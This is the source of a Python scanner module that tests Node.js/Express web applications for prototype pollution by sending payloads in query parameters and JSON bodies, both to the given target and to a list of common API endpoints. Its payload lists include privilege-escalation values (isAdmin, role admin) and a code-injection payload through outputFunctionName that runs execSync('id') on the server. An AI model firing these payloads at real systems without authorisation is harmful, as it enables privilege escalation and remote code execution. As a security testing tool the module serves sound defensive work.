"""
cyberm4fia-scanner - Prototype Pollution Scanner
Detects JavaScript prototype pollution via URL parameters and JSON bodies.
Targets Node.js/Express applications with merge/extend patterns.
"""

import json
from urllib.parse import urlparse

from utils.colors import log_info, log_success
from utils.request import increment_vulnerability_count, smart_request
from utils.request import ScanExceptions

# ─────────────────────────────────────────────────────
# Prototype Pollution Payloads
# ─────────────────────────────────────────────────────

# URL parameter-based payloads
URL_PAYLOADS = [
    # __proto__ pollution
    ("__proto__[polluted]", "cyberm4fia"),
    ("__proto__.polluted", "cyberm4fia"),
    ("constructor[prototype][polluted]", "cyberm4fia"),
    ("constructor.prototype.polluted", "cyberm4fia"),
    # Specific exploitation payloads
    ("__proto__[isAdmin]", "true"),
    ("__proto__[role]", "admin"),
    ("__proto__[shell]", "/bin/sh"),
    ("__proto__[env]", '{"NODE_OPTIONS":"--require=/proc/self/cmdline"}'),
    ("__proto__[status]", "500"),
    (
        "__proto__[outputFunctionName]",
        'x;process.mainModule.require("child_process").execSync("id");x',
    ),
    # Nested pollution
    ("__proto__[toString]", "cyberm4fia"),
    ("__proto__[valueOf]", "1"),
    ("__proto__[0]", "cyberm4fia"),
]

# JSON body-based payloads
JSON_PAYLOADS = [
    {"__proto__": {"polluted": "cyberm4fia"}},
    {"constructor": {"prototype": {"polluted": "cyberm4fia"}}},
    {"__proto__": {"isAdmin": True}},
    {"__proto__": {"role": "admin"}},
    {"__proto__": {"status": 500}},
    {"__proto__": {"outputFunctionName": "x;throw new Error('pp')//"}},
]

# Detection signatures — things that indicate pollution worked
POLLUTION_SIGNATURES = [
    "cyberm4fia",
    '"polluted"',
    '"isAdmin":true',
    '"role":"admin"',
    "pp",
]

# Common endpoints that might use object merge
MERGE_ENDPOINTS = [
    "/api/settings",
    "/api/config",
    "/api/preferences",
    "/api/profile",
    "/api/user",
    "/api/update",
    "/settings",
    "/profile",
    "/account",
    "/preferences",
]

def _test_url_params(url, delay=0):
    """Test prototype pollution via URL query parameters."""
    findings = []

    # Get baseline
    try:
        baseline = smart_request("get", url, delay=delay, timeout=5)
        baseline_text = baseline.text
        baseline_status = baseline.status_code
        baseline_len = len(baseline_text)
    except ScanExceptions:
        return findings

    for param_name, param_value in URL_PAYLOADS:
        try:
            # Append pollution payload to URL
            separator = "&" if "?" in url else "?"
            test_url = f"{url}{separator}{param_name}={param_value}"

            resp = smart_request("get", test_url, delay=delay, timeout=5)

            # Check for pollution indicators
            vuln_detected = False
            evidence = ""

            # 1. Check if payload value appears in response (reflected pollution)
            if param_value in resp.text and param_value not in baseline_text:
                vuln_detected = True
                evidence = f"Payload value '{param_value}' reflected in response"

            # 2. Check for status code change
            if resp.status_code != baseline_status and resp.status_code == 500:
                vuln_detected = True
                evidence = f"Status changed: {baseline_status} → {resp.status_code} (possible DoS via pollution)"

            # 3. Check for significant response difference
            diff = abs(len(resp.text) - baseline_len)
            if diff > 200 and resp.status_code == 200:
                # Verify it's not just natural variance
                verify = smart_request("get", url, delay=delay, timeout=5)
                verify_diff = abs(len(verify.text) - baseline_len)
                if diff > verify_diff * 3:
                    vuln_detected = True
                    evidence = f"Response size changed by {diff} bytes"

            if vuln_detected:
                increment_vulnerability_count()

                severity = "HIGH"
                if "isAdmin" in param_name or "role" in param_name:
                    severity = "CRITICAL"
                elif "shell" in param_name or "exec" in param_name:
                    severity = "CRITICAL"

                findings.append(
                    {
                        "type": "Prototype Pollution",
                        "vector": "URL Parameter",
                        "param": param_name,
                        "payload": param_value,
                        "evidence": evidence,
                        "severity": severity,
                        "url": url,
                    }
                )
                log_success(f"🧬 Prototype Pollution! {param_name}={param_value}")
                return findings  # One is enough to confirm

        except ScanExceptions:
            pass

    return findings

def _test_json_body(url, delay=0):
    """Test prototype pollution via JSON request body."""
    findings = []

    headers = {"Content-Type": "application/json"}

    # Get baseline with normal JSON
    try:
        baseline = smart_request(
            "post",
            url,
            json={"test": "normal"},
            headers=headers,
            delay=delay,
            timeout=5,
        )
        baseline_text = baseline.text
        baseline_status = baseline.status_code
    except ScanExceptions:
        return findings

    for payload in JSON_PAYLOADS:
        try:
            resp = smart_request(
                "post", url, json=payload, headers=headers, delay=delay, timeout=5
            )

            vuln_detected = False
            evidence = ""

            # Check for pollution signatures in response
            for sig in POLLUTION_SIGNATURES:
                if sig in resp.text and sig not in baseline_text:
                    vuln_detected = True
                    evidence = f"Pollution signature '{sig}' in response"
                    break

            # Server error from pollution
            if resp.status_code == 500 and baseline_status != 500:
                vuln_detected = True
                evidence = "Server error (500) triggered by pollution payload"

            if vuln_detected:
                increment_vulnerability_count()

                payload_str = json.dumps(payload)[:100]
                findings.append(
                    {
                        "type": "Prototype Pollution",
                        "vector": "JSON Body",
                        "payload": payload_str,
                        "evidence": evidence,
                        "severity": "HIGH",
                        "url": url,
                    }
                )
                log_success(f"🧬 JSON Prototype Pollution! {payload_str}")
                return findings

        except ScanExceptions:
            pass

    return findings

def _test_merge_endpoints(base_url, delay=0):
    """Test common API endpoints that likely use object merge/extend."""
    findings = []

    parsed = urlparse(base_url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    for endpoint in MERGE_ENDPOINTS:
        test_url = f"{base}{endpoint}"

        # Test URL params on merge endpoint
        url_findings = _test_url_params(test_url, delay)
        findings.extend(url_findings)

        # Test JSON body on merge endpoint
        json_findings = _test_json_body(test_url, delay)
        findings.extend(json_findings)

        if findings:
            break  # Found one, stop

    return findings

def scan_proto_pollution(url, forms=None, delay=0):
    """
    Main Prototype Pollution scanner entry point.
    Tests URL params, JSON bodies, and common merge endpoints.
    """
    log_info("Starting Prototype Pollution Scanner...")
    all_findings = []

    # Test main URL with URL params
    log_info("  → Testing URL parameter pollution...")
    all_findings.extend(_test_url_params(url, delay))

    # Test JSON body pollution
    log_info("  → Testing JSON body pollution...")
    all_findings.extend(_test_json_body(url, delay))

    # Test common merge endpoints
    if not all_findings:
        log_info("  → Probing common API merge endpoints...")
        all_findings.extend(_test_merge_endpoints(url, delay))

    # Test form actions with pollution
    if forms and not all_findings:
        log_info("  → Testing form targets...")
        for form in forms[:5]:
            action = form.get("action", url)
            if form.get("method", "GET").upper() == "POST":
                all_findings.extend(_test_json_body(action, delay))
            else:
                all_findings.extend(_test_url_params(action, delay))
            if all_findings:
                break

    if not all_findings:
        log_info("No prototype pollution detected.")

    log_success(f"Prototype pollution scan complete. {len(all_findings)} finding(s).")
    return all_findings
